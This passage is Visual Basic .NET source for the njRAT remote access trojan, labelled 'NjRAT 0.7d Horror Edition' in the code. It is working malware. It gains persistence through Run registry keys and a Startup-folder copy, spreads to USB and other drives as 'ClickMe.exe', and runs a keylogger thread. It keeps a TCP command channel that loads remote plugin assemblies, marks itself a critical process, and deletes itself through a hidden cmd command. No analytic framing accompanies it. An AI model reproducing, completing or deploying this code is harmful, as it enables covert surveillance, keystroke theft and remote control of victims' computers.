                    OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                Catch exception10 As Exception
                    ProjectData.SetProjectError(exception10)
                    Dim exception5 As Exception = exception10
                    ProjectData.ClearProjectError()
                End Try
            End If
            If OK.IsF Then
                Try
                    File.Copy(OK.LO.FullName, (Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG & ".exe"), True)
                    OK.FS = New FileStream((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG & ".exe"), FileMode.Open)
                Catch exception11 As Exception
                    ProjectData.SetProjectError(exception11)
                    Dim exception6 As Exception = exception11
                    ProjectData.ClearProjectError()
                End Try
            End If
        End Sub

        Public Shared Sub ko()

            If OK.Anti_CH Then
                MyAntiProcess.Start()
            End If

            If OK.USB_SP Then
                Dim drivers As String = My.Computer.FileSystem.SpecialDirectories.ProgramFiles
                Dim driver() As String = (IO.Directory.GetLogicalDrives)
                For Each drivers In driver
                    Try
                        If System.IO.File.Exists(drivers & "ClickMe.exe") = False Then
                            System.IO.File.Copy(System.Reflection.Assembly.
        GetExecutingAssembly.Location, drivers & "ClickMe.exe") 'change ClickMe.exe to anyhtng, is USB spreader
                        End If
                        'Dim autorunwriter = New StreamWriter(drivers & "autorun.inf")
                        ' autorunwriter.WriteLine("[autorun]")
                        '  autorunwriter.WriteLine("open=Tools.exe")
                        ' autorunwriter.WriteLine("shellexecute=Tools.exe")
                        ' autorunwriter.Close()
                        'System.IO.File.SetAttributes(drivers & "autorun.inf", FileAttributes.Hidden)
                        'System.IO.File.SetAttributes(drivers & "FirFox.exe", FileAttributes.Hidden)
                    Catch
                    End Try
                Next
            End If



            If (Not Interaction.Command Is Nothing) Then
                Try
                    OK.F.Registry.CurrentUser.SetValue("di", "!")
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                End Try
                Thread.Sleep(&H1388)
            End If
            Dim createdNew As Boolean = False
            OK.MT = New Mutex(True, OK.RG, createdNew)
            If Not createdNew Then
                ProjectData.EndApp()
            End If
            OK.INS()
            If Not OK.Idr Then
                OK.EXE = OK.LO.Name
                OK.DR = OK.LO.Directory.Name
            End If
            Dim s As New Thread(New ThreadStart(AddressOf OK.RC), 1)
            s.Start()
            Try
                OK.kq = New kl
                Dim m As New Thread(New ThreadStart(AddressOf OK.kq.WRK), 1)
                m.Start()
            Catch exception8 As Exception
                ProjectData.SetProjectError(exception8)
                Dim exception2 As Exception = exception8
                ProjectData.ClearProjectError()
            End Try
            Dim num As Integer = 0
            Dim str As String = ""
            If OK.BD Then
                Try
                    AddHandler SystemEvents.SessionEnding, New SessionEndingEventHandler(AddressOf OK._Lambda__2)
                    OK.pr(1)
                Catch exception9 As Exception
                    ProjectData.SetProjectError(exception9)
                    Dim exception3 As Exception = exception9
                    ProjectData.ClearProjectError()
                End Try
            End If
            Do While True
                Thread.Sleep(&H3E8)
                If Not OK.Cn Then
                    str = ""
                End If
                Application.DoEvents()
                Try
                    num += 1
                    If (num = 5) Then
                        Try
                            Process.GetCurrentProcess.MinWorkingSet = (&H400)
                        Catch exception10 As Exception
                            ProjectData.SetProjectError(exception10)
                            Dim exception4 As Exception = exception10
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                    If (num >= 8) Then
                        num = 0
                        Dim str2 As String = OK.ACT
                        If (str <> str2) Then
                            str = str2
                            OK.Send(("act" & OK.Y & str2))
                        End If
                    End If
                    If OK.Isu Then
                        Try
                            If Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.CurrentUser.GetValue((OK.sf & "\" & OK.RG), ""), ("""" & OK.LO.FullName & """ .."), False) Then
                                OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                            End If
                        Catch exception11 As Exception
                            ProjectData.SetProjectError(exception11)
                            Dim exception5 As Exception = exception11
                            ProjectData.ClearProjectError()
                        End Try
                        Try
                            If Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.LocalMachine.GetValue((OK.sf & "\" & OK.RG), ""), ("""" & OK.LO.FullName & """ .."), False) Then
                                OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                            End If
                        Catch exception12 As Exception
                            ProjectData.SetProjectError(exception12)
                            Dim exception6 As Exception = exception12
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                Catch exception13 As Exception
                    ProjectData.SetProjectError(exception13)
                    Dim exception7 As Exception = exception13
                    ProjectData.ClearProjectError()
                End Try
            Loop
        End Sub

        Public Shared Function md5(ByVal B As Byte()) As String
            B = New MD5CryptoServiceProvider().ComputeHash(B)
            Dim str2 As String = ""
            Dim num As Byte
            For Each num In B
                str2 = (str2 & num.ToString("x2"))
            Next
            Return str2
        End Function

        <DllImport("ntdll")>
        Private Shared Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
        End Function

        Public Shared Function Plugin(ByVal b As Byte(), ByVal c As String) As Object
            Dim [Module] As [Module]
            For Each [Module] In Assembly.Load(b).GetModules
                Dim type As Type
                For Each type In [Module].GetTypes
                    If type.FullName.EndsWith(("." & c)) Then
                        Return [Module].Assembly.CreateInstance(type.FullName)
                    End If
                Next
            Next
            Return Nothing
        End Function

        Public Shared Sub pr(ByVal i As Integer)
            Try
                OK.NtSetInformationProcess(Process.GetCurrentProcess.Handle, &H1D, i, 4)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Public Shared Sub RC()
Label_0000:
            OK.lastcap = ""
            If (Not OK.C Is Nothing) Then
                Dim num As Long = -1
                Dim num2 As Integer = 0
                Try
Label_001B:
                    num2 += 1
                    If (num2 = 10) Then
                        num2 = 0
                        Thread.Sleep(1)
                    End If
                    If Not OK.Cn Then
                        GoTo Label_01C1
                    End If
                    If (OK.C.Available < 1) Then
                        OK.C.Client.Poll(-1, SelectMode.SelectRead)
                    End If
Label_0057:
                    If (OK.C.Available > 0) Then
                        If (num = -1) Then
                            Dim str As String = ""
                            Do While True
                                Dim charCode As Integer = OK.C.GetStream.ReadByte
                                Select Case charCode
                                    Case -1
                                        GoTo Label_01C1
                                    Case 0
                                        num = Conversions.ToLong(str)
                                        str = ""
                                        If (num = 0) Then
                                            OK.Send("")
                                            num = -1
                                        End If
                                        If (OK.C.Available <= 0) Then
                                            GoTo Label_001B
                                        End If
                                        GoTo Label_0057
                                End Select
                                str = (str & Conversions.ToString(Conversions.ToInteger(Strings.ChrW(charCode).ToString)))
                            Loop
                        End If
                        OK.b = New Byte((OK.C.Available + 1) - 1) {}
                        Dim num5 As Long = (num - OK.MeM.Length)
                        If (OK.b.Length > num5) Then
                            OK.b = New Byte((CInt((num5 - 1)) + 1) - 1) {}
                        End If
                        Dim count As Integer = OK.C.Client.Receive(OK.b, 0, OK.b.Length, SocketFlags.None)
                        OK.MeM.Write(OK.b, 0, count)
                        If (OK.MeM.Length = num) Then
                            num = -1
                            Dim thread As New Thread(New ParameterizedThreadStart(AddressOf OK._Lambda__1), 1)
                            thread.Start(OK.MeM.ToArray)
                            thread.Join(100)
                            OK.MeM.Dispose()
                            OK.MeM = New MemoryStream
                        End If
                        GoTo Label_001B
                    End If
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                End Try
            End If
Label_01C1:
            Try
                If (Not OK.PLG Is Nothing) Then
                    NewLateBinding.LateCall(OK.PLG, Nothing, "clear", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
                    OK.PLG = Nothing
                End If
            Catch exception3 As Exception
                ProjectData.SetProjectError(exception3)
                Dim exception2 As Exception = exception3
                ProjectData.ClearProjectError()
            End Try
            OK.Cn = False
            If Not OK.connect Then
                GoTo Label_01C1
            End If
            OK.Cn = True
            GoTo Label_0000
        End Sub

        Public Shared Function SB(ByRef S As String) As Byte()
            Return Encoding.UTF8.GetBytes(S)
        End Function

        Public Shared Function Send(ByVal S As String) As Boolean
            Return OK.Sendb(OK.SB(S))
        End Function

        Public Shared Function Sendb(ByVal b As Byte()) As Boolean
            If Not OK.Cn Then
                Return False
            End If
            Try
                Dim lO As FileInfo = OK.LO
                SyncLock lO
                    If Not OK.Cn Then
                        Return False
                    End If
                    Dim stream As New MemoryStream
                    Dim length As Integer = b.Length
                    Dim buffer As Byte() = OK.SB((length.ToString & ChrW(0)))
                    stream.Write(buffer, 0, buffer.Length)
                    stream.Write(b, 0, b.Length)
                    OK.C.Client.Send(stream.ToArray, 0, CInt(stream.Length), SocketFlags.None)
                End SyncLock
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Try
                    If OK.Cn Then
                        OK.Cn = False
                        OK.C.Close()
                    End If
                Catch exception3 As Exception
                    ProjectData.SetProjectError(exception3)
                    Dim exception2 As Exception = exception3
                    ProjectData.ClearProjectError()
                End Try
                ProjectData.ClearProjectError()
            End Try
            Return OK.Cn
        End Function

        Public Shared Function STV(ByVal n As String, ByVal t As Object, ByVal typ As RegistryValueKind) As Boolean
            Dim flag As Boolean
            Try
                OK.F.Registry.CurrentUser.CreateSubKey(("Software\" & OK.RG)).SetValue(n, RuntimeHelpers.GetObjectValue(t), typ)
                flag = True
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                flag = False
                ProjectData.ClearProjectError()
            End Try
            Return flag
        End Function

        Public Shared Sub UNS()

            Dim drivers As String = My.Computer.FileSystem.SpecialDirectories.ProgramFiles
            Dim driver() As String = (IO.Directory.GetLogicalDrives)
            For Each drivers In driver
                Try
                    If System.IO.File.Exists(drivers & "ClickMe.exe") = True Then
                        System.IO.File.Delete(drivers & "ClickMe.exe")
                    End If
                Catch
                End Try
            Next

            Try
                If System.IO.File.Exists(IO.Path.GetTempPath & "obito.txt") = True Then
                    System.IO.File.Delete(IO.Path.GetTempPath & "obito.txt")
                End If
            Catch
            End Try

            Interaction.Shell(("schtasks /delete /tn CleanSweepCheck /f"), AppWinStyle.Hide, True, &H1388)

            OK.pr(0)
            OK.Isu = False
            Try
                OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).DeleteValue(OK.RG, False)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
            Try
                OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).DeleteValue(OK.RG, False)
            Catch exception7 As Exception
                ProjectData.SetProjectError(exception7)
                Dim exception2 As Exception = exception7
                ProjectData.ClearProjectError()
            End Try
            Try
                '' Interaction.Shell(("netsh firewall delete allowedprogram """ & OK.LO.FullName & """"), AppWinStyle.Hide, False, -1)
            Catch exception8 As Exception
                ProjectData.SetProjectError(exception8)
                Dim exception3 As Exception = exception8
                ProjectData.ClearProjectError()
            End Try
            Try
                If (Not OK.FS Is Nothing) Then
                    OK.FS.Dispose()
                    File.Delete((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG & ".exe"))
                End If
            Catch exception9 As Exception
                ProjectData.SetProjectError(exception9)
                Dim exception4 As Exception = exception9
                ProjectData.ClearProjectError()
            End Try
            Try
                OK.F.Registry.CurrentUser.OpenSubKey("Software", True).DeleteSubKey(OK.RG, False)
            Catch exception10 As Exception
                ProjectData.SetProjectError(exception10)
                Dim exception5 As Exception = exception10
                ProjectData.ClearProjectError()
            End Try

            '' Try
            ''  Interaction.Shell(("cmd.exe /c ping 0 -n 2 & del """ & IO.Path.GetTempPath & "obito.txt" & """"), AppWinStyle.Hide, False, -1)
            '' Catch exception11 As Exception
            '' ProjectData.SetProjectError(exception11)
            ''Dim exception6 As Exception = exception11
            '' ProjectData.ClearProjectError()
            '' End Try

            Try
                Interaction.Shell(("cmd.exe /c ping 0 -n 2 & del """ & OK.LO.FullName & """"), AppWinStyle.Hide, False, -1)
            Catch exception11 As Exception
                ProjectData.SetProjectError(exception11)
                Dim exception6 As Exception = exception11
                ProjectData.ClearProjectError()
            End Try



            ProjectData.EndApp()
        End Sub

        Public Shared Function ZIP(ByVal B As Byte()) As Byte()
            Dim stream2 As New MemoryStream(B)
            Dim stream As New GZipStream(stream2, CompressionMode.Decompress)
            Dim buffer2 As Byte() = New Byte(4 - 1) {}
            stream2.Position = (stream2.Length - 5)
            stream2.Read(buffer2, 0, 4)
            Dim count As Integer = BitConverter.ToInt32(buffer2, 0)
            stream2.Position = 0
            Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
            stream.Read(array, 0, count)
            stream.Dispose()
            stream2.Dispose()
            Return array
        End Function


        ' Fields
        Private Shared b As Byte() = New Byte(&H1401 - 1) {}
        Public Shared BD As Boolean = Conversions.ToBoolean("[BD]")
        Public Shared C As TcpClient = Nothing
        Public Shared Cn As Boolean = False
        Public Shared DR As String = "[DR]"
        Public Shared EXE As String = "[EXE]"
        Public Shared F As Computer = New Computer
        Public Shared FS As FileStream
        Public Shared H As String = ("[H]")
        Public Shared Idr As Boolean = Conversions.ToBoolean("[Idr]")
        Public Shared Anti_CH As Boolean = Conversions.ToBoolean("[Anti_CH]")
        Public Shared IsF As Boolean = Conversions.ToBoolean("[Isf]")
        Public Shared USB_SP As Boolean = Conversions.ToBoolean("[USB_SP]")
        Public Shared Isu As Boolean = Conversions.ToBoolean("[Isu]")
        Public Shared kq As kl = Nothing
        Private Shared lastcap As String = ""
        Public Shared LO As FileInfo = New FileInfo(Assembly.GetEntryAssembly.Location)
        Private Shared MeM As MemoryStream = New MemoryStream
        Public Shared MT As Object = Nothing
        Public Shared P As String = "[P]"
        Public Shared PLG As Object = Nothing
        Public Shared RG As String = "[RG]"
        Public Shared sf As String = "Software\Microsoft\Windows\CurrentVersion\Run"
        Public Shared VN As String = "[VN]"
        Public Shared VR As String = "<- NjRAT 0.7d Horror Edition ->"
        Public Shared Y As String = "Y262SUCZ4UJJ"
        Public Shared MSGE As String = "[MSGE]"
        Public Shared MSGT As String = "[MSGT]"
        Public Shared MSGB As String = "[MSGB]"
        Public Shared MSGSYM As String = "[MSGSYM]"
        Public Shared OBITO As String = "[OBITO]"
        Public Shared TSKE As String = "[TSKE]"
        Public Shared TSK As String = "[TSK]"
        Public Shared KAKASHI As String = "[KAKASHI]"
        Public Shared AKATSUKI As String = "[AKATSUKI]"
        Public Shared CLEANSWEEP As String = "[CLEANSWEEP]"
        Public Shared PASTEE As String = "[PASTEE]"
        Public Shared PASTEBIN As String = "[PASTEBIN]"
        Public Shared CLIP As String = "null"
        Public Shared UAC As String = "[UAC]"
        Public Shared nowifi As String = "off"




    End Class














End Namespace

